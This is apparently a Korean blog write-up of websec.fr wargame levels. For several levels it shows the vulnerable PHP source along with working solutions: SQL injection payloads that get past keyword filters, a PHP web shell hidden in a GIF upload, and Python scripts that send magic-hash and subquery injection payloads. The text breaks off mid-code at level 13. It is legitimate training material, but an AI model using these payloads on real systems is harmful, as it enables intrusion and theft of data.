        <content type="html"><![CDATA[<h3 id="1-LEVEL-2"><a href="#1-LEVEL-2" class="headerlink" title="1. LEVEL 2"></a>1. LEVEL 2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LevelTwo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doQuery</span>(<span class="params"><span class="variable">$injection</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$pdo</span> = <span class="keyword">new</span> SQLite3(<span class="string">&#x27;leveltwo.db&#x27;</span>, SQLITE3_OPEN_READONLY);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$searchWords</span> = implode ([<span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;group&#x27;</span>, <span class="string">&#x27;by&#x27;</span>], <span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">        <span class="variable">$injection</span> = preg_replace (<span class="string">&#x27;/&#x27;</span> . <span class="variable">$searchWords</span> . <span class="string">&#x27;/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$injection</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&#x27;SELECT id,username FROM users WHERE id=&#x27;</span> . <span class="variable">$injection</span> . <span class="string">&#x27; LIMIT 1&#x27;</span>;</span><br><span class="line">        <span class="variable">$getUsers</span> = <span class="variable">$pdo</span>-&gt;query (<span class="variable">$query</span>);</span><br><span class="line">        <span class="variable">$users</span> = <span class="variable">$getUsers</span>-&gt;fetchArray (SQLITE3_ASSOC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$users</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$users</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>음 이전에 babystep 단계에서 풀었던 문제와 비슷한 수준입니다.</p><p>조금 달라진 것이 있다면 입력값 필터링(union, order, select) 등을 필터링 합니다.</p><p>근데 정규식(match)가 아닌 replace 방식이기 때문에 ununionion 과 같이 사용한다면 이를 우회할 수 있습니다.</p><p>table structure -&gt; 1 ununionion seselectlect 1,sql frfromom sqlite_master– -</p><p>password -&gt; 1 ununionion seselectlect id,password frfromom users where id=1– -</p><hr><h3 id="2-LEVEL-8"><a href="#2-LEVEL-8" class="headerlink" title="2. LEVEL 8"></a>2. LEVEL 8</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uploadedFile</span> = sprintf(<span class="string">&#x27;%1$s/%2$s&#x27;</span>, <span class="string">&#x27;/uploads&#x27;</span>, sha1(<span class="variable">$_FILES</span>[<span class="string">&#x27;fileToUpload&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]) . <span class="string">&#x27;.gif&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists (<span class="variable">$uploadedFile</span>)) &#123; unlink (<span class="variable">$uploadedFile</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;fileToUpload&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &lt;= <span class="number">50000</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (getimagesize (<span class="variable">$_FILES</span>[<span class="string">&#x27;fileToUpload&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (exif_imagetype(<span class="variable">$_FILES</span>[<span class="string">&#x27;fileToUpload&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) === IMAGETYPE_GIF) &#123;</span><br><span class="line">            move_uploaded_file (<span class="variable">$_FILES</span>[<span class="string">&#x27;fileToUpload&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadedFile</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;p class=&quot;lead&quot;&gt;Dump of &lt;a href=&quot;/level08&#x27;</span> . <span class="variable">$uploadedFile</span> . <span class="string">&#x27;&quot;&gt;&#x27;</span>. htmlentities(<span class="variable">$_FILES</span>[<span class="string">&#x27;fileToUpload&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]) . <span class="string">&#x27;&lt;/a&gt;:&lt;/p&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">include_once</span>(<span class="variable">$uploadedFile</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">            unlink(<span class="variable">$uploadedFile</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&#x27;&lt;p class=&quot;text-danger&quot;&gt;The file is not a GIF&lt;/p&gt;&#x27;</span>; &#125;</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&#x27;&lt;p class=&quot;text-danger&quot;&gt;The file is not an image&lt;/p&gt;&#x27;</span>; &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&#x27;&lt;p class=&quot;text-danger&quot;&gt;The file is too big&lt;/p&gt;&#x27;</span>; &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>파일 업로드 취약점 문제이다. gif 확장자의 사진 파일만 업로드할 수 있도록 해놨지만</p><p>사진 파일 안에 php 코드를 넣어서 웹 쉘을 사용할 수 있다.</p><p>다만 시스템 함수 사용이 안되기 때문에 scandir 함수를 통해 디렉토리 목록을 읽고 플래그 파일을 읽으면 된다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> print_r(scandir(<span class="string">&quot;./&quot;</span>)); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> show_source(<span class="string">&quot;flag.txt&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><h3 id="3-LEVEL-10"><a href="#3-LEVEL-10" class="headerlink" title="3. LEVEL 10"></a>3. LEVEL 10</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;f&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hash&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="variable">$request</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;hash&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$hash</span> = substr (md5 (<span class="variable">$flag</span> . <span class="variable">$file</span> . <span class="variable">$flag</span>), <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;row&quot;&gt;&lt;br&gt;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$request</span> == <span class="variable">$hash</span>) &#123;</span><br><span class="line">        show_source (<span class="variable">$file</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Permission denied!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> $file 변수에는 특정 파일명 를 넣고 $request 변수에는 hash 값을 입력하게 되는데,</p><p>이 입력한 hash에 대해 $request == $hash 와 같이 $hash 변수에 정의된 값이랑 비교하게 된다.</p><p>이후 두 해쉬값이 동일하면 show_source 함수를 통해 $file에 정의된 파일의 소스코드를 보여준다.</p><p>조건문을 보면 == (loose comparison) 느슨한 비교를 하고 있기 때문에 magic hash 취약점을 이용하면 풀이가 가능하다.</p><p>관련 자료는 아래 사이트를 참고하자.</p><ul><li>자료 : <a href="https://velog.io/@woounnan/ROOTME-PHP-Loose-Comparison">https://velog.io/@woounnan/ROOTME-PHP-Loose-Comparison</a></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">    url = <span class="string">&quot;https://websec.fr/level10/index.php&quot;</span></span><br><span class="line">    f = <span class="string">&quot;flag.php&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">870</span>,<span class="number">1000</span>):</span><br><span class="line">        param = &#123;<span class="string">&quot;f&quot;</span>:f, <span class="string">&quot;hash&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">        r = requests.post(url, data=param)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;Permission denied!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            print(r.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;sending payload..&quot;</span> +<span class="built_in">str</span>(i)</span><br><span class="line"></span><br><span class="line">        f = <span class="string">&#x27;.&#x27;</span> + <span class="string">&#x27;/&#x27;</span> * i + <span class="string">&#x27;flag.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><hr><h3 id="4-LEVEL-11"><a href="#4-LEVEL-11" class="headerlink" title="4. LEVEL 11"></a>4. LEVEL 11</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;on&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;error_reporting&#x27;</span>, E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$table</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/* Rock-solid: https://secure.php.net/manual/en/function.is-numeric.php */</span></span><br><span class="line">    <span class="keyword">if</span> (! is_numeric (<span class="variable">$id</span>) <span class="keyword">or</span> <span class="variable">$id</span> &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;The id must be numeric, and superior to one.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Rock-solid too! */</span></span><br><span class="line">    <span class="variable">$special1</span> = [<span class="string">&quot;!&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>];</span><br><span class="line">    <span class="variable">$special2</span> = [<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;]&quot;</span>];</span><br><span class="line">    <span class="variable">$special3</span> = [<span class="string">&quot;^&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;&#125;&quot;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = [<span class="string">&quot;union&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;as&quot;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = array_merge (<span class="variable">$special1</span>, <span class="variable">$special2</span>, <span class="variable">$special3</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos(<span class="variable">$table</span>, <span class="variable">$value</span>) !== <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;Presence of &#x27;&quot;</span> . <span class="variable">$value</span> . <span class="string">&quot;&#x27; detected: abort, abort, abort!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;user_id&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;table&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">    <span class="variable">$table</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;table&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    sanitize(<span class="variable">$id</span>, <span class="variable">$table</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pdo</span> = <span class="keyword">new</span> SQLite3(<span class="string">&#x27;database.db&#x27;</span>, SQLITE3_OPEN_READONLY);</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&#x27;SELECT id,username FROM &#x27;</span> . <span class="variable">$table</span> . <span class="string">&#x27; WHERE id = &#x27;</span> . <span class="variable">$id</span>;</span><br><span class="line">    <span class="comment">//$query = &#x27;SELECT id,username,enemy FROM &#x27; . $table . &#x27; WHERE id = &#x27; . $id;</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$getUsers</span> = <span class="variable">$pdo</span>-&gt;query(<span class="variable">$query</span>);</span><br><span class="line">    <span class="variable">$users</span> = <span class="variable">$getUsers</span>-&gt;fetchArray(SQLITE3_ASSOC);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userDetails</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$users</span>) &#123;</span><br><span class="line">        <span class="variable">$userDetails</span> = <span class="variable">$users</span>;</span><br><span class="line">    <span class="variable">$userDetails</span>[<span class="string">&#x27;table&#x27;</span>] = htmlentities(<span class="variable">$table</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sqlite injection 문제이다. 입력할 수 있는 부분은 <code> user_id, table </code></p><p>두 가지가 있는데 user_id 부분에는 아래와 같이 is_numberic 함수로 숫자만 입력할 수 있도록 필터링 한다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! is_numeric (<span class="variable">$id</span>) <span class="keyword">or</span> <span class="variable">$id</span> &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;The id must be numeric, and superior to one.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>때문에 table 부분에 payload를 작성하고 데이터를 보낼 것이다.</p><p>여기서도 보고가야할 점은 union,join 이외에 여러가지 특수 문자들을 필터링 하고 있어서</p><p>as가 없어도 alias를 사용할 수 있기 때문에 이것을 우회할 수 있다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query <span class="operator">=</span> <span class="string">&#x27;SELECT id,username,enemy FROM &#x27;</span> . $<span class="keyword">table</span> . <span class="string">&#x27; WHERE id = &#x27;</span> . $id;</span><br></pre></td></tr></table></figure><p>이제 쿼리문을 맞춰주기만 하면 되는데 코드 내에 이렇게 답을 다 주는 수준이라서 그냥 뽑아내기만 하면 된다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;https://websec.fr/level11/index.php&#x27;</span></span><br><span class="line">    param = &#123;<span class="string">&#x27;user_id&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;table&#x27;</span>:<span class="string">&#x27;(select 2 id,enemy username from costume)&#x27;</span>,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;submit&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url, data=param)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    submit()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><hr><h3 id="5-LEVEL-13"><a href="#5-LEVEL-13" class="headerlink" title="5. LEVEL 13"></a>5. LEVEL 13</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Defines $flag</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite::memory:&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;exec(<span class="string">&#x27;CREATE TABLE users (</span></span><br><span class="line"><span class="string">  user_id   INTEGER PRIMARY KEY,</span></span><br><span class="line"><span class="string">  user_name TEXT NOT NULL,</span></span><br><span class="line"><span class="string">  user_privileges INTEGER NOT NULL,</span></span><br><span class="line"><span class="string">  user_password TEXT NOT NULL</span></span><br><span class="line"><span class="string">)&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span>-&gt;prepare(<span class="string">&quot;INSERT INTO users VALUES(0, &#x27;admin&#x27;, 0, &#x27;<span class="subst">$flag</span>&#x27;);&quot;</span>)-&gt;execute();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span>&lt;<span class="number">25</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">  <span class="variable">$pass</span> = md5(uniqid());</span><br><span class="line">  <span class="variable">$user</span> = <span class="string">&quot;user_&quot;</span> . substr(crc32(<span class="variable">$pass</span>), <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="variable">$db</span>-&gt;prepare(<span class="string">&quot;INSERT INTO users VALUES(<span class="subst">$i</span>, &#x27;<span class="subst">$user</span>&#x27;, 1, &#x27;<span class="subst">$pass</span>&#x27;);&quot;</span>)-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ids&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ! is_string(<span class="variable">$_GET</span>[<span class="string">&#x27;ids&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t be silly.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;ids&#x27;</span>]) &gt; <span class="number">70</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Please don&#x27;t check all the privileges at once.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$tmp</span> = explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;ids&#x27;</span>]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$tmp</span>); <span class="variable">$i</span>++ ) &#123;</span><br><span class="line">        <span class="variable">$tmp</span>[<span class="variable">$i</span>] = (<span class="keyword">int</span>)<span class="variable">$tmp</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$tmp</span>[<span class="variable">$i</span>] &lt; <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$tmp</span>[<span class="variable">$i</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$selector</span> = implode(<span class="string">&#x27;,&#x27;</span>, array_unique(<span class="variable">$tmp</span>));</span><br><span class="line"></span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;SELECT user_id, user_privileges, user_name</span></span><br><span class="line"><span class="string">  FROM users</span></span><br><span class="line"><span class="string">  WHERE (user_id in (&quot;</span> . <span class="variable">$selector</span> . <span class="string">&quot;));&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;query(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;well&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$stmt</span>-&gt;fetch(\PDO::FETCH_ASSOC)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;User &lt;em&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;user_name&#x27;</span>] . <span class="string">&quot;&lt;/em&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;    with id &lt;code&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>] . <span class="string">&#x27;&lt;/code&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot; has &lt;b&gt;&quot;</span> . (<span class="variable">$row</span>[<span class="string">&#x27;user_privileges&#x27;</span>] == <span class="number">0</span>?<span class="string">&quot;all&quot;</span>:<span class="string">&quot;no&quot;</span>) . <span class="string">&quot;&lt;/b&gt; privileges.&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/li&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/ul&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>문제의 코드이다. 핵심만 찾아서 한번 분석 해보자</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tmp</span> = explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;ids&#x27;</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$tmp</span>); <span class="variable">$i</span>++ ) &#123;</span><br><span class="line">      <span class="variable">$tmp</span>[<span class="variable">$i</span>] = (<span class="keyword">int</span>)<span class="variable">$tmp</span>[<span class="variable">$i</span>];</span><br><span class="line">      <span class="keyword">if</span>( <span 